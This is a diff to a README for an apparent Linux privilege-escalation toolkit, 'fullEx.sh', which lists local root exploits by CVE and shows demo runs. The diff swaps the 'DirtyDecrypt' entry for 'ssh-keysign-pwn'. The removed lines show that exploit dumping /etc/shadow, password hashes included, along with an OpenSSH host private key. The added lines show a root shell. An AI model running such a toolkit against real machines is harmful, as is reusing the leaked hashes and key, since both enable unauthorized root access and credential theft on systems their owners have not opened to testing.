@@ -14,7 +14,7 @@
 | Copy-Fail | CVE-2026-31431 | ✅ |
 | Dirty-Frag | CVE-2026-43284 | ✅ |
 | Fragnesia | CVE-2026-46300 |✅|
-| DirtyDecrypt | CVE-2026-31635 |✅|
+| ssh-keysign-pwn | CVE-2026-46333 |✅|
 | PeditCow | CVE-2026-46331 |✅|
 
 ## ⚙️ Outils
@@ -65,7 +65,7 @@ Exploits:
    -PKroot        Pack2TheRoot - CVE-2026-41651
    -DirtyFrag     Dirty Frag - CVE-2026-43284
    -Fragnesia     Fragnesia - CVE-2026-46300
-   -DirtyDecrypt  pwn-key-ssh & chage - CVE-2026-31635
+   -SKP           ssh-keysign-pwn - CVE-2026-46333
    -PeditCow      Compilation + execution binaire - CVE-2026-46331
  
 Cmds:
@@ -312,52 +312,16 @@ sender_status=0 receiver_status=0
 # id    
 uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
 ```
-## 💀 DirtyDecrypt
+## 💀 ssh-keysign-pwn
 
 ```
-osboxes@ubuntu2204:~/fullEx$ ./fullEx.sh -DirtyDecrypt
-fd 6 -> /etc/shadow (round=56 try=0)
-root:$y$j9T$2i0jg43MIXEb46SaesJNb/$aTKP442ulqTqE/pv93W8HFCgu4Qi2JHJY0lO7RjMxC5:20572:0:99999:7:::
-daemon:*:20571:0:99999:7:::
-bin:*:20571:0:99999:7:::
-sys:*:20571:0:99999:7:::
-sync:*:20571:0:99999:7:::
-games:*:20571:0:99999:7:::
-man:*:20571:0:99999:7:::
-lp:*:20571:0:99999:7:::
-mail:*:20571:0:99999:7:::
-news:*:20571:0:99999:7:::
-uucp:*:20571:0:99999:7:::
-proxy:*:20571:0:99999:7:::
-www-data:*:20571:0:99999:7:::
-backup:*:20571:0:99999:7:::
-list:*:20571:0:99999:7:::
-irc:*:20571:0:99999:7:::
-_apt:*:20571:0:99999:7:::
-nobody:*:20571:0:99999:7:::
-systemd-network:!*:20571:::::1:
-dhcpcd:!:20571::::::
-systemd-timesync:!*:20571:::::1:
-messagebus:!*:20571::::::
-sshd:!*:20571::::::
-avahi:!:20571::::::
-polkitd:!*:20573::::::
-Debian-snmp:!:20578::::::
-mojito:$y$j9T$jZ7U.Ywiffoyh2nfWLdOD.$OIHmj.wiIo3ot6RhGkjw.vS61u/8MUcuakU.89aIvA/:20584:0:99999:7:::
-mosquitto:!:20594::::::
--------------------------
-uid=1001  target=/usr/lib/openssh/ssh-keysign
-fd 4 -> /etc/ssh/ssh_host_ecdsa_key (round=34 try=0)
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
-1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQSfX6IHQauqXHbfhqEgHulw8jxmGMxB
-tmgOmrcn78m7h8sLKQ5Y5kg1ip4aHJCb4Ffu8c+lhwrP0uMH9KXWp2SZAAAAqDpFFGk6RR
-RpAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9fogdBq6pcdt+G
-oSAe6XDyPGYYzEG2aA6atyfvybuHywspDljmSDWKnhockJvgV+7xz6WHCs/S4wf0pdanZJ
-kAAAAhAN2+SJmR1TjQaFfcYq4sEhPUs0NaPEnle/9Ec+zX/bUNAAAAC3Jvb3RAZGViaWFu
-AQIDBA==
------END OPENSSH PRIVATE KEY-----
+user@debian:~/fullEx$ ./fullEx.sh -SKP
+# alive: EPERM on fd 3
+
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(user)
 ```
+
 ## 💀 PeditCow
 
 ```
